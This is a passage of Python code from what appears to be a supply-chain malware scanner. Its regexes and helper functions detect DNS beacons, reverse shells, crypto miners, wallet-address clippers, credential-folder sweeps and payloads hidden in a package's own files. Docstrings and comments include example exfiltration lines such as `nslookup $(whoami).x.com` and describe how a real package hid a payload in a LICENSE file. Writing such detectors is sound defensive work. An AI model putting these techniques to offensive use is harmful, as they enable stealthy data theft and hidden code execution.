_DNS_SUM_RE = re.compile(r"""\+\s*(?:"[^"\n]*\.([A-Za-z]{2,})"|'[^'\n]*\.([A-Za-z]{2,})'|`[^`$\n]*\.([A-Za-z]{2,})`)\s*\Z""")
_DNS_FORMAT_RE = re.compile(
    r"""\A(?:"[^"\n]*(?:%(?:\([^)\n]*\))?[-#0 +]?\d*[sdirx]|\{[^}\n]*\})[^"\n]*\.([A-Za-z]{2,})"|"""
    r"""'[^'\n]*(?:%(?:\([^)\n]*\))?[-#0 +]?\d*[sdirx]|\{[^}\n]*\})[^'\n]*\.([A-Za-z]{2,})')"""
    r"""\s*(?:%|\.\s*format\s*\()""")
# string literals taken out of a sum to see what else it adds (a template
# with a field is a value)
_DNS_LITERAL_RE = re.compile(r""""[^"\n]*"|'[^'\n]*'|`[^`$\n]*`""")
_DNS_VALUE_RE = re.compile(r"[A-Za-z_$(]")
_DNS_NAME_RE = re.compile(r"\A[A-Za-z_$][\w$]*\Z")
# the name's assignment: the pattern built around it (the name escaped between)
_DNS_ASSIGN_HEAD = r"(?<![^\n;{])[ \t]*(?:(?:const|let|var)[ \t]+)?"
_DNS_ASSIGN_TAIL = r"[ \t]*=(?![=>])[ \t]*([^\n;]*)"
_DNS_LOCAL_TLDS = frozenset(("local", "localhost", "localdomain", "internal", "intranet", "lan", "home", "corp",
                             "private", "test", "example", "invalid", "arpa"))
# the identity written into a shell command, the commands that look a name
# up (earlier in the same command: after the last line break, |, ; or &), and
# the host that holds it (the identity marked \x00 in the token around it)
_DNS_SHELL_ID_RE = re.compile(
    r"\$\(\s*(?:whoami|hostname|id\s+-un|uname\s+-n)\s*\)|`\s*(?:whoami|hostname|id\s+-un|uname\s+-n)\s*`"
    r"|\$\{?(?:USER|USERNAME|HOSTNAME|LOGNAME)\b\}?|%(?:USERNAME|COMPUTERNAME|USERDOMAIN)%"
    r"|\$env:(?:USERNAME|COMPUTERNAME|USERDOMAIN)\b", re.I)
_DNS_SHELL_CMD_RE = re.compile(r"(?<![\w.$-])(?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s")
# a command that looks a name up, written in code: a literal that starts it
# and a sum that ends it (`'nslookup ' + h + '.x.com'`), or a template, an
# f-string or a format string with a field in the name (`f"ping {h}.x.com"`)
_DNS_CMD_SUM_RE = re.compile(
    r"""(["'`])(?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s[^"'`\n]{0,100}\1\s*\+([^\n;]{1,300})""")
_DNS_CMD_TEMPLATE_RE = re.compile(
    r"""["'`](?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s[^"'`\n]{0,200}?\{[^}\n]+\}"""
    r"""[^\s"'`/:\n]*\.([A-Za-z]{2,})(?![\w.-])""")
_DNS_SHELL_CUT_RE = re.compile(r"[\n|;&]")
_DNS_SHELL_LEFT_RE = re.compile(r"""[^\s"'`(]*\Z""")
_DNS_SHELL_RIGHT_RE = re.compile(r"""[^\s"'`)]*""")
_DNS_SHELL_HOST_RE = re.compile(
    r"""\A(?:https?://)?[^\s/:"'`|;&<>()]*\x00[^\s/:"'`|;&<>()]*\.([A-Za-z]{2,})(?![\w.-])""")
_DNS_LOOKUP_MAX = 50             # lookups, and identities in shell commands, read per text
_DNS_ARG_SPAN = 400              # characters of a lookup's arguments read
_DNS_ASSIGN_SPAN = 5000          # characters before a lookup searched for its name's assignment
_DNS_SHELL_SPAN = 300            # characters of a shell command read each side of the identity
_REVSHELL_NGROK_TCP_RE = re.compile(r"\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b", re.I)
_REVSHELL_ARG_SHELL_RE = re.compile(
    r"""["'](?:nc|ncat|netcat|(?:/bin/)?(?:ba|z|da)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?)["']""")
_REVSHELL_ARGS_RE = re.compile(
    r"""["'](?:nc|ncat|netcat)["'][^\n]{0,160}?["']-[ec]["']\s*,\s*["'](?:/bin/)?(?:ba|z|da)?sh["']""")
_REVSHELL_ARGS_NEEDLES = ("'nc'", '"nc"', "'ncat'", '"ncat"', "'netcat'", '"netcat"')
# What an ngrok TCP address holds (case as written: the prefilter of the
# case-blind _REVSHELL_NGROK_TCP_RE). Needles, like the lists beside them:
# a plain `".ngrok.io" in text` reads to code scanners as a URL check.
_REVSHELL_NGROK_NEEDLES = (".ngrok.io",)
_IP_LITERAL_RE = re.compile(
    r"""["'](?!(?:127|0|255)\.)((?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d))["']""")
_RAW_CONNECT_RE = re.compile(
    r"\b(?:socket\.create_connection|net\.connect|net\.createConnection|connect(?:_ex)?)\s*\(|\bnew\s+net\.Socket\b")
_RAW_CONNECT_SPAN = 600          # characters after an IP literal searched for the connection
_IP_LITERAL_MAX = 100            # IP literals examined per text
_MONERO_ADDR_RE = re.compile(r"(?<![A-Za-z0-9])[48][1-9A-HJ-NP-Za-km-z]{94}(?:[1-9A-HJ-NP-Za-km-z]{11})?(?![A-Za-z0-9])")
_MINER_ARG_RE = re.compile(r"""["'](?:-o|--url)["']|\bstratum\+(?:tcp|ssl|tls)://|--donate-level\b|\b(?:xmrig|XMRig|XMRIG)\b""")
_MINER_ARG_NEEDLES = ("'-o'", '"-o"', "'--url'", '"--url"', "stratum+", "--donate-level", "xmrig", "XMRig", "XMRIG")
_PUBLIC_RESOLVERS = frozenset({"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "149.112.112.112",
                               "208.67.222.222", "208.67.220.220"})


def _se_secret(segment):
    """Is a path segment a credential (see above)?"""
    return (_SE_SEGMENT_RE.fullmatch(segment) is not None and len(set(segment)) >= _SE_MIN_DISTINCT
            and any(c.isupper() for c in segment) and any(c.islower() for c in segment)
            and any(c.isdigit() for c in segment))


def _se_url_secret(url, values):
    """Does a URL (an _SE_URL_RE match) carry a credential in its path (see
    above)? `values`: the literals names are given, for the holes of a
    template or an f-string."""
    for segment in url.group(2).split("/"):
        if "{" in segment:
            segment = _SE_HOLE_RE.sub(lambda h: values.get(h.group(1) or h.group(2), "{"), segment)
        if _se_secret(segment):
            return True
    return False


def secret_endpoint_at(text):
    """(offset, reason) of the first request to a webhook whose secret is
    written in `text` (see above), else None."""
    if "http" not in text or not any(nd in text for nd in _SE_NEEDLES):
        return None
    values = {}                                     # name -> the plain literal it is given
    assigns = []                                    # (name, start, end) of what is assigned
    for k, m in enumerate(_DD_ASSIGN_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        lit = _LD_PLAIN_LITERAL_RE.match(m.group(2).strip())
        if lit is not None:
            values.setdefault(m.group(1), lit.group(2))
        assigns.append((m.group(1), m.start(2), _ld_statement_end(text, m.start(2))))
    endpoints = []                                  # (start, host) of the literals that hold one
    for a, b in _literal_spans(text):
        if len(endpoints) >= _SE_MAX:
            break
        if text.find("http", a, b) < 0:
            continue
        for url in _SE_URL_RE.finditer(text, a, b):
            if _se_url_secret(url, values):
                endpoints.append((a, url.group(1).rsplit("@", 1)[-1][:60]))
                break
    if not endpoints:
        return None
    starts = [a for a, _ in endpoints]
    in_literal = _ld_literal_test(text)
    held = {}                                       # name -> the host of the endpoint it holds

    def holds(lo, hi):
        """The host of an endpoint written, or held by a name, in text[lo:hi], else None."""
        k = bisect.bisect_left(starts, lo)
        if k < len(starts) and starts[k] < hi:
            return endpoints[k][1]
        if held:
            for m in _IDENT_TOKEN_RE.finditer(text, lo, hi):
                if m.group() in held and not in_literal(m.start()):
                    return held[m.group()]
        return None

    params = {}                                     # the script's own functions -> their parameters
    for k, m in enumerate(_LD_FUNC_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        name = m.group(1) or m.group(3) or m.group(5) or m.group(9)
        plist = next((g for g in (m.group(2), m.group(4), m.group(6), m.group(7), m.group(8), m.group(10))
                      if g is not None), "")
        names = [p.group(1) for p in map(_LD_PARAM_RE.match, plist.split(","))
                 if p is not None and p.group(1) not in ("self", "cls")]
        if names and name not in params and len(params) < _SE_MAX:
            params[name] = names
    call_re = (re.compile(_DV_NAME_HEAD + "(" + "|".join(re.escape(n) for n in sorted(params)) + r")\s*\(")
               if params else None)
    for _ in range(_DD_PASSES):
        grown = False
        for name, lo, hi in assigns:
            if name not in held:
                host = holds(lo, hi)
                if host is not None:
                    held[name] = host
                    grown = True
        if call_re is not None:
            for k, c in enumerate(call_re.finditer(text)):
                if k >= _SE_MAX:
                    break
                if in_literal(c.start()):
                    continue
                args = _call_args(text[c.end():c.end() + _DD_ARG_SPAN])
                for param, lo, hi in _ld_bound(text, c.end(), args, params[c.group(1)]):
                    if param not in held:
                        host = holds(lo, hi)
                        if host is not None:
                            held[param] = host
                            grown = True
        if not grown:
            break
    found = []
    for pattern, where in ((_SE_REQUEST_RE, None), (_LD_EXEC_SEND_RE, _LD_NET_PROGRAM_RE)):
        for k, r in enumerate(pattern.finditer(text)):
            if k >= _SE_MAX:
                break
            if in_literal(r.start()):
                continue
            args = _call_args(text[r.end():r.end() + _DD_ARG_SPAN])
            if where is not None and where.search(args) is None:
                continue
            host = holds(r.end(), r.end() + len(args))
            if host is not None:
                found.append((r.start(), host))
                break
    if not found:
        return None
    at, host = min(found)
    return at, f"sends data to a webhook whose secret is written in the code ({host})"


def credential_sweep_at(text):
    """(offset, names) where `text` names _CRED_SWEEP_MIN or more distinct
    credential folders within _CRED_SWEEP_SPAN characters, else None."""
    if sum(1 for nd in _CRED_SWEEP_NEEDLES if nd in text) < _CRED_SWEEP_MIN:
        return None
    found = []
    for k, m in enumerate(_CRED_DIR_RE.finditer(text)):
        if k >= _CRED_SWEEP_MAX:
            break
        found.append((m.start(), m.group(1).replace("\\", "/")))
    for i, (at, _name) in enumerate(found):
        names = []
        for at2, name in found[i:]:
            if at2 - at > _CRED_SWEEP_SPAN:
                break
            if name not in names:
                names.append(name)
        if len(names) >= _CRED_SWEEP_MIN:
            return at, names
    return None


def _exfil_signs(text, host):
    """(offset, reason) of the exfiltration shapes above that `text` shows,
    and of a miner, for the install-script and import-time tests (the
    whole-environment copy and the reverse shell are read by those tests'
    own checks). `host`: _HOST_INFO_RE.search(text)."""
    signs = []
    at = miner_at(text)
    if at >= 0:
        signs.append((at, "runs a cryptocurrency miner (a Monero wallet address)"))
    swap = wallet_swap_at(text)
    if swap is not None:
        signs.append((swap[0], f"swaps the cryptocurrency wallet addresses its user copies or sends for its own "
                               f"({swap[1]})"))
    endpoint = secret_endpoint_at(text)
    if endpoint is not None:
        signs.append(endpoint)
    net = []                          # _NETWORK_RE's answer, searched once when needed

    def network():
        if not net:
            net.append(_NETWORK_RE.search(text) is not None)
        return net[0]
    sweep = credential_sweep_at(text)
    if sweep is not None and network():
        signs.append((sweep[0], "collects files from several credential folders and sends data over the network "
                                f"({', '.join('.' + n for n in sweep[1][:4])})"))
    if host and _B64_URL_LITERAL_RE.search(text) and network():
        signs.append((host.start(), "sends the machine's user or host name to an address it hides in base64"))
    at = dns_beacon_at(text, host is not None)
    if at >= 0:
        signs.append((at, "sends the machine's user or host name in a DNS lookup of a name it builds"))
    if host:
        drop = dead_drop_at(text)
        if drop is not None:
            signs.append((drop[0], f"sends the machine's user or host name to an address it fetches at run time "
                                   f"(from {drop[1]})"))
    return signs


def _call_first_arg(args):
    """The first argument of a call: `args` (what follows its '(', as
    _call_args gives it) up to a comma outside brackets and string literals,
    stripped."""
    depth, i, n = 0, 0, len(args)
    while i < n:
        ch = args[i]
        if ch in "\"'`":
            j = args.find(ch, i + 1)
            if j < 0:
                break
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            return args[:i].strip()
        i += 1
    return args.strip()


def _dns_domain_ok(tld):
    return tld is not None and tld.lower() not in _DNS_LOCAL_TLDS


def _dns_built(expr):
    """Does the expression `expr` build a name from values and a literal
    domain (see above)?"""
    m = _DNS_TEMPLATE_RE.match(expr)
    if m is not None:
        built = _DNS_BUILT_NAME_RE.search(next(g for g in m.groups() if g is not None))
        return built is not None and _dns_domain_ok(built.group(1))
    m = _DNS_SUM_RE.search(expr)
    if m is not None:
        # the domain, and a value in the sum (not only literals)
        return (_dns_domain_ok(m.group(1) or m.group(2) or m.group(3))
                and _DNS_VALUE_RE.search(_DNS_LITERAL_RE.sub("", expr[:m.start()])) is not None)
    m = _DNS_FORMAT_RE.match(expr)
    return m is not None and _dns_domain_ok(m.group(1) or m.group(2))


def _dns_shell_at(text):
    """The offset of a shell command that looks up a name holding the
    machine's user or host name (see above), else -1."""
    for k, m in enumerate(_DNS_SHELL_ID_RE.finditer(text)):
        if k >= _DNS_LOOKUP_MAX:
            break
        head = text[max(0, m.start() - _DNS_SHELL_SPAN):m.start()]
        cuts = [c.end() for c in _DNS_SHELL_CUT_RE.finditer(head)]
        head = head[cuts[-1]:] if cuts else head
        cmd = _DNS_SHELL_CMD_RE.search(head)
        if cmd is None:
            continue
        tail = text[m.end():m.end() + _DNS_SHELL_SPAN]
        cut = _DNS_SHELL_CUT_RE.search(tail)
        tail = _DNS_SHELL_ID_RE.sub("\x00", tail[:cut.start()] if cut is not None else tail)
        token = (_DNS_SHELL_LEFT_RE.search(head).group() + "\x00"
                 + _DNS_SHELL_RIGHT_RE.match(tail).group())
        found = _DNS_SHELL_HOST_RE.match(token)
        if found is not None and _dns_domain_ok(found.group(1)):
            return m.start() - len(head) + cmd.start()
    return -1


def _dns_call_at(text):
    """The offset of a lookup call of a built name (see above), else -1."""
    for k, m in enumerate(_DNS_CALL_RE.finditer(text)):
        if k >= _DNS_LOOKUP_MAX:
            break
        arg = _call_first_arg(_call_args(text[m.end():m.end() + _DNS_ARG_SPAN]))
        if _dns_built(arg):
            return m.start()
        if _DNS_NAME_RE.match(arg):
            assign = re.compile(_DNS_ASSIGN_HEAD + re.escape(arg) + _DNS_ASSIGN_TAIL)
            last = None
            for a in assign.finditer(text, max(0, m.start() - _DNS_ASSIGN_SPAN), m.start()):
                last = a
            if last is not None and _dns_built(last.group(1).strip()):
                return m.start()
    return -1


def _dns_command_at(text):
    """The offset of a lookup command code writes with a built name (see
    above), else -1."""
    found = []
    for k, m in enumerate(_DNS_CMD_SUM_RE.finditer(text)):
        if k >= _DNS_LOOKUP_MAX:
            break
        rest = _call_first_arg(_call_args(m.group(2)))
        tail = _DNS_SUM_RE.search("+" + rest)
        if (tail is not None and _dns_domain_ok(tail.group(1) or tail.group(2) or tail.group(3))
                and _DNS_VALUE_RE.search(_DNS_LITERAL_RE.sub("", rest[:max(0, tail.start() - 1)])) is not None):
            found.append(m.start())
            break
    for k, m in enumerate(_DNS_CMD_TEMPLATE_RE.finditer(text)):
        if k >= _DNS_LOOKUP_MAX:
            break
        if _dns_domain_ok(m.group(1)):
            found.append(m.start())
            break
    return min(found) if found else -1


def dns_beacon_at(text, host=True):
    """The offset of a DNS lookup of a name `text` builds from values and a
    literal domain (`getaddrinfo(f"{h}.{u}.x.com")`, `dns.lookup(h + '.x.com')`,
    `nslookup $(whoami).x.com`: see above), else -1. `host`: does the text
    read the machine's user or host name? Without, only a shell command's
    name that holds it counts."""
    found = [at for at in ((_dns_call_at(text), _dns_command_at(text)) if host else ()) if at >= 0]
    at = _dns_shell_at(text)
    if at >= 0:
        found.append(at)
    return min(found) if found else -1


def miner_at(text):
    """The offset of the Monero wallet address `text` runs a miner with (see
    above), else -1."""
    if not any(nd in text for nd in _MINER_ARG_NEEDLES) or _MINER_ARG_RE.search(text) is None:
        return -1
    m = _MONERO_ADDR_RE.search(text)
    if m and _EXEC_CALL_RE.search(text):
        return m.start()
    return -1


# ---------------- Cryptocurrency wallet addresses swapped (0.1.8) ----------------
# A script that puts its own wallet address in place of the one its user
# copies, sends or signs for (a clipper; a page script that hooks fetch,
# XMLHttpRequest or the wallet's provider) shows three parts, all needed:
#   - patterns of wallet addresses of two kinds or more, written as a regex (a
#     literal or a string): an Ethereum address (0x and 40 hex digits), base58
#     (Bitcoin, Litecoin, Tron, Solana …: the alphabet's class), bech32 (bc1,
#     ltc1, bnb1 … or its alphabet), a Tron address, Bitcoin Cash;
#   - where the user's addresses pass, intercepted: the clipboard read and
#     written, or the page's requests and its wallet (fetch or
#     XMLHttpRequest.prototype replaced, the provider wrapped);
#   - a wallet address written in the code (not the zero address): its own.
# A validator has the patterns, a wallet's page has the clipboard, a
# monitoring SDK wraps fetch: none has all three.
_WS_PATTERN_RE = re.compile(
    r"(0x\)?\??\[[^\]\n]{2,24}\](?:\{40\}|\{40,40\}))"
    r"|(\[[^\]\n]{0,12}(?:A-HJ-NP-Z[^\]\n]{0,12}a-km-z|a-km-z[^\]\n]{0,12}A-HJ-NP-Z)[^\]\n]{0,12}\])"
    r"|((?:bc1|ltc1|bnb1|tb1|addr1)\)?\??\[|qpzry9x8gf2tvdw0s3jn54khce6mua7l)"
    r"|(\bT\]?\[A-Za-z1-9\]\{33\})"
    r"|(bitcoincash:)")
_WS_NEEDLES = ("{40}", "A-HJ-NP-Z", "a-km-z", "qpzry9x8gf2tvdw0s3jn54khce6mua7l", "bitcoincash:", "{33}")
_WS_ADDRESS_RE = re.compile(
    r"""["'`](?:0x(?!0{40})[a-fA-F0-9]{40}|(?:bc1|ltc1|tb1)[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{25,62}"""
    r"""|bnb1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}|[13LM][a-km-zA-HJ-NP-Z1-9]{25,34}|T[1-9A-HJ-NP-Za-km-z]{33})["'`]""")
_WS_CLIP_READ_RE = re.compile(
    r"""\bclipboard\s*\.\s*read(?:Text)?\s*\(|\bexecCommand["'\]\s]*\(\s*["']paste["']"""
    r"""|\b(?:pyperclip|clipboardy|win32clipboard|xerox|klembord)\s*\.\s*(?:paste|readSync|readText|read"""
    r"""|GetClipboardData|get)\s*\(|\bclipboard_get\s*\(|\bGetClipboardData\b|\bGet-Clipboard\b|\bpbpaste\b"""
    r"""|\bxclip\b[^\n"'`]{0,40}\s-o\b|\bxsel\b[^\n"'`]{0,40}\s(?:-o|--output)\b""")
_WS_CLIP_WRITE_RE = re.compile(
    r"""\bclipboard\s*\.\s*write(?:Text)?\s*\(|\bexecCommand["'\]\s]*\(\s*["']copy["']"""
    r"""|\b(?:pyperclip|clipboardy|win32clipboard|xerox|klembord)\s*\.\s*(?:copy|writeSync|writeText|write"""
    r"""|SetClipboardText|SetClipboardData|set)\s*\(|\bclipboard_append\s*\(|\bSetClipboardData\b|\bSet-Clipboard\b"""
    r"""|\bpbcopy\b|\bxclip\b|\bxsel\b""")
_WS_HOOK_RE = re.compile(
    r"""\bXMLHttpRequest\s*\.\s*prototype\s*\.\s*(?:open|send)\s*=(?!=)"""
    r"""|(?<![\w$.])(?:(?:window|globalThis|self|global)\s*\.\s*)?fetch\s*=\s*(?:async\b|function\b|\()"""
    r"""|\bethereum\s*\.\s*(?:request|send|sendAsync|enable)\s*=(?!=)|\bProxy\s*\(\s*(?:window\s*\.\s*)?ethereum\b"""
    r"""|\bdefineProperty\s*\(\s*window\s*,\s*["']ethereum["']""")
_WS_MAX = 200                    # wallet address patterns examined per text


def wallet_swap_at(text):
    """(offset, where) of the wallet addresses `text` swaps for its own (see
    above): where the user's addresses pass — "the clipboard", "the page's
    requests and its wallet" — else None."""
    if not any(nd in text for nd in _WS_NEEDLES):
        return None
    kinds, first = set(), -1
    for k, m in enumerate(_WS_PATTERN_RE.finditer(text)):
        if k >= _WS_MAX:
            break
        kinds.add(m.lastindex)
        if first < 0:
            first = m.start()
    if len(kinds) < 2 or _WS_ADDRESS_RE.search(text) is None:
        return None
    if _WS_HOOK_RE.search(text) is not None:
        return first, "the page's requests and its wallet"
    if _WS_CLIP_READ_RE.search(text) is not None and _WS_CLIP_WRITE_RE.search(text) is not None:
        return first, "the clipboard"
    return None


def raw_ip_connect(text):
    """The first hard-coded IP address `text` opens a raw socket to (a
    literal with a connection within _RAW_CONNECT_SPAN characters after it;
    loopback and the public DNS resolvers excepted), else None — install
    time only."""
    if "connect" not in text and "Socket" not in text:
        return None
    for k, m in enumerate(_IP_LITERAL_RE.finditer(text)):
        if k >= _IP_LITERAL_MAX:
            break
        if m.group(1) in _PUBLIC_RESOLVERS:
            continue
        if _RAW_CONNECT_RE.search(text, m.end(), m.end() + _RAW_CONNECT_SPAN):
            return m.group(1)
    return None


# Code read back from the file itself (0.1.7). A payload — or a hint such as
# a C2 address — can sit in a comment or a docstring of the file that uses
# it, read back with open(__file__), Path(__file__).read_text(), linecache,
# __loader__.get_source or __doc__ (in JavaScript readFileSync(__filename),
# import.meta.url, a function's .toString()). Running what such a read gives —
# or what a read of a data file shipped next to the code gives (a path built
# from __file__ / __dirname / import.meta.url that names a file with a
# non-code extension: .txt, .dat, .png …) — is a sign of its own: a value
# assigned from the read is followed through the names it is assigned to
# (_SELF_READ_PASSES levels), to a runner's arguments (at most
# _SELF_READ_ARG_SPAN characters of each of the first _SELF_READ_MAX_CALLS
# runners). A .py or .js file read and run is not: setup.py's
# `exec(open("pkg/version.py").read())` reads a version. The import-time test
# reads a file that reads its own source with its prose (_import_code).
#
# (0.1.8) The data file may be a licence or a readme without an extension,
# which holds no code (react-thunk-log 2.23.2 kept its payload, encrypted, in
# lib/utils/smtp-connection/LICENSE, next to the script its install hook
# starts); what a read gives may arrive asynchronously — the second parameter
# of the read's callback (`fs.readFile(p, 'utf8', (err, data) => …)`), the
# parameter of a `.then(…)` chained to it, a Python `with open(…) as f`; and
# the path may be built on a line of its own and read by its name (`const p =
# path.join(__dirname, 'LICENSE')` … `fs.readFile(p, …)`). A value that comes
# from a path read by name counts only in a code runner (eval, exec, compile,
# new Function, vm.run*): a CLI reads its package.json by name and puts the
# version in a git command.
_SELF_READ_RE = re.compile(
    r"\bopen\s*\(\s*(?:os\.path\.(?:abspath|realpath)\s*\(\s*)?__file__\b"
    r"|\bPath\s*\(\s*__file__\s*\)\s*\.\s*(?:read_text|read_bytes|open)\s*\("
    r"|\blinecache\.getlines?\s*\(\s*__file__\b|(?<![\w.])__loader__\s*\.\s*get_source\s*\(|(?<![\w.])__doc__\b"
    r"|\breadFile(?:Sync)?\s*\(\s*(?:__filename\b|(?:new\s+URL\s*\(\s*)?import\.meta\.url"
    r"|fileURLToPath\s*\(\s*import\.meta\.url)|\barguments\s*\.\s*callee\b|\}\s*\)?\s*\.\s*toString\s*\(\s*\)")
_DATA_EXT = (r"(?:txt|dat|bin|png|jpe?g|gif|ico|bmp|svg|wav|mp3|mp4|woff2?|ttf|json|md|cfg|ini|log|db|pyc|so|dll"
             r"|dylib|exe)")
# a data file's name inside quotes: a data extension, or a licence or readme
# with or without one (no template's `${…}` in it: a name that runs into one
# is read again from every delimiter)
_DATA_FILE = (r"(?:[^\"'`{}$\n]{1,100}\." + _DATA_EXT + r"|(?:[^\"'`{}$\n]{0,100}[/\\])?"
              r"(?:LICEN[CS]E|COPYING|NOTICE|README|AUTHORS|CHANGELOG|CHANGES|HISTORY|PATENTS)(?:[-.]\w{1,10})?)")
_SIBLING_DATA_RE = re.compile(
    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\([^\n]{0,200}?(?:__file__|__dirname|import\.meta\.url)"
    r"[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"']"
    r"|(?:__file__|__dirname)[^\n]{0,200}?[\"']" + _DATA_FILE + r"[\"'][^\n]{0,60}?"
    r"\.\s*(?:read_text|read_bytes)\s*\(")
# a data file's path, assigned to a name: the file named after __file__,
# __dirname or import.meta.url, in quotes or after a template's `${__dirname}/`
_SIBLING_PATH_RE = re.compile(
    r"(?:__file__|__dirname|import\.meta\.url)[^\n]{0,200}?(?:[\"'`]|\}[/\\])" + _DATA_FILE + r"[\"'`]")
# a read of a path by its name (the name is checked against the data-file
# paths), a read call's head, the node-style callback in its arguments, and
# what may follow the call: `.then(x => …)` or Python's `as f`
_PATH_READ_RE = re.compile(
    r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(\s*([A-Za-z_$][\w$]*)\s*[,)]"
    r"|(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*(?:read_text|read_bytes)\s*\(")
_READ_HEAD_RE = re.compile(r"\b(?:open|read_text|read_bytes|readFileSync|readFile)\s*\(")
_READ_CALLBACK_RE = re.compile(r"\(\s*[A-Za-z_$][\w$]*\s*,\s*([A-Za-z_$][\w$]*)\s*\)\s*(?:=>|\{)")
_READ_THEN_RE = re.compile(
    r"\s*(?:\.\s*then\s*\(\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)|as\s+([A-Za-z_]\w*))")
_SELF_RUN_RE = re.compile(
    r"(?<![\w.$])(?:exec|eval|compile)\s*\(|\bnew\s+Function\s*\(|\bvm\s*\.\s*run\w*\s*\("
    r"|\b(?:execSync|system|popen|Popen|check_output|getoutput)\s*\(|\bsubprocess\s*\.\s*\w+\s*\(")
# the runners that run a shell command, not code
_SELF_SHELL_RUNNERS = ("execSync", "system", "popen", "Popen", "check_output", "getoutput", "subprocess")
_SELF_READ_ASSIGN_RE = re.compile(
    r"(?<![^\n])[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*(?::[^=\n]*)?=(?![=>])([^\n]*)")
_IDENT_TOKEN_RE = re.compile(r"(?<![\w$.])[A-Za-z_$][\w$]*")
_SELF_READ_PASSES = 3            # levels of names followed from a read
_SELF_READ_MAX_CALLS = 200       # runners examined per text, and read calls
_SELF_READ_ARG_SPAN = 2000       # characters of a runner's or a read's arguments read
_SELF_READ_MAX_ASSIGNS = 5000    # assignments examined per text
_SELF_READ_THEN_SPAN = 200       # characters after a read's call searched for .then( or `as`


def reads_own_source(text):
    """Does `text` read its own source (see above)?"""
    return _SELF_READ_RE.search(text) is not None


def _call_args(text):
    """`text` (what follows a call's '(') up to the bracket that closes the
    call; string literals are skipped."""
    depth, i, n = 0, 0, len(text)
    while i < n:
        ch = text[i]
        if ch in "\"'`":
            j = text.find(ch, i + 1)
            if j < 0:
                return text
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                return text[:i]
            depth -= 1
        i += 1
    return text


_LITERAL_SPANS_MAX = 20000       # literals a text's runners and reads are told apart from


_QUOTE_CHAR_RE = re.compile("[\"'`]")


def _literal_spans(text):
    """(start, end) of the string literals of `text`, as _string_literals
    reads them (at most _LITERAL_SPANS_MAX of them). One pass."""
    out, n = [], len(text)
    m = _QUOTE_CHAR_RE.search(text)
    while m is not None and len(out) < _LITERAL_SPANS_MAX:
        i = m.start()
        ch = text[i]
        if ch != "`" and text.startswith(ch * 3, i):
            j = text.find(ch * 3, i + 3)
            end = n if j < 0 else j + 3
        else:
            j = i + 1
            while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
                j += 2 if text[j] == "\\" else 1
            end = min(j + 1, n)
        out.append((i, end))
        m = _QUOTE_CHAR_RE.search(text, end)
    return out


def runs_own_source_at(text):
    """The offset of a runner that runs code `text` reads from its own
    source or from a data file shipped next to it (see above), else -1.
    Runners, reads and names inside string literals do not count (a code
    template in a string, a list of dunder names)."""
    if not (_SELF_READ_RE.search(text) or _SIBLING_DATA_RE.search(text) or _SIBLING_PATH_RE.search(text)):
        return -1
    spans = _literal_spans(text)
    starts = [s for s, _ in spans]

    def literal_at(pos):
        """The literal (start, end) that pos is in, or None."""
        k = bisect.bisect_right(starts, pos) - 1
        return spans[k] if k >= 0 and pos < spans[k][1] else None

    def in_literal(pos):
        return literal_at(pos) is not None

    def reads(lo, hi):
        part = text[lo:hi]
        return any(not in_literal(lo + m.start()) for rx in (_SELF_READ_RE, _SIBLING_DATA_RE)
                   for m in rx.finditer(part))

    def path_reads(lo, hi):
        return bool(paths) and any((m.group(1) or m.group(2)) in paths and not in_literal(lo + m.start())
                                   for m in _PATH_READ_RE.finditer(text[lo:hi]))

    def uses(lo, hi, names):
        return bool(names) and any(m.group() in names and not in_literal(lo + m.start())
                                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))

    assigns = []
    for k, m in enumerate(_SELF_READ_ASSIGN_RE.finditer(text)):
        if k >= _SELF_READ_MAX_ASSIGNS:
            break
        if not in_literal(m.start(1)):
            assigns.append((m.group(1), m.start(2), m.end(2)))
    paths = set()                   # names of data files' paths (a template's `${__dirname}` counts)
    for name, lo, hi in assigns:
        for m in _SIBLING_PATH_RE.finditer(text[lo:hi]):
            lit = literal_at(lo + m.start())
            if lit is None or text[lit[0]] == "`":
                paths.add(name)
                break
    if not (reads(0, len(text)) or path_reads(0, len(text))):
        return -1
    names = set()                   # values of a read written out: any runner
    code_names = set()              # values of a path read by name: code runners only
    for k, h in enumerate(_READ_HEAD_RE.finditer(text)):
        if k >= _SELF_READ_MAX_CALLS:
            break
        if in_literal(h.start()):
            continue
        args = _call_args(text[h.end():h.end() + _SELF_READ_ARG_SPAN])
        close = h.end() + len(args)                 # the closing bracket, when there is one
        into = (names if reads(h.start(), close + 1) else code_names if path_reads(h.start(), close + 1)
                else None)
        if into is None:
            continue
        cb = _READ_CALLBACK_RE.search(args)
        if cb is not None and not in_literal(h.end() + cb.start()):
            into.add(cb.group(1))
        if close < len(text) and text[close] == ")":
            then = _READ_THEN_RE.match(text[close + 1:close + 1 + _SELF_READ_THEN_SPAN])
            if then is not None:
                into.add(then.group(1) or then.group(2))
    for _ in range(_SELF_READ_PASSES):
        grown = False
        for name, lo, hi in assigns:
            if name in names:
                continue
            if reads(lo, hi) or uses(lo, hi, names):
                names.add(name)
                grown = True
            elif name not in code_names and (path_reads(lo, hi) or uses(lo, hi, code_names)):
